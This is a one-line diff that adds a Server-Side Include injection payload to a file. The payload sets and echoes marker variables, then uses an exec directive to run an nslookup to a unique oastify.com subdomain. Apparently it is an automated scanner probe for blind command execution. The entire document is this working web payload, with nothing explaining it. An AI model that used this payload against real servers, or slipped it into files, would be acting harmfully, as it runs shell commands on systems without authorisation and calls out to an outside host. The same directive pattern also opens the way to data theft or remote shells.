@@ -1,0 +1,1 @@
+<!--#set var="bbc" value="aabw7rf1sy"--><!--#set var="dde" value="ccdy9th3u0"--><!--#echo var="bbc"--><!--#echo var="dde"--><!--#exec cmd="nslookup -q=cname xxyjue2ofl9623cvlc0lm1533u9nxfn3f13tqlea.oastify.com" -->
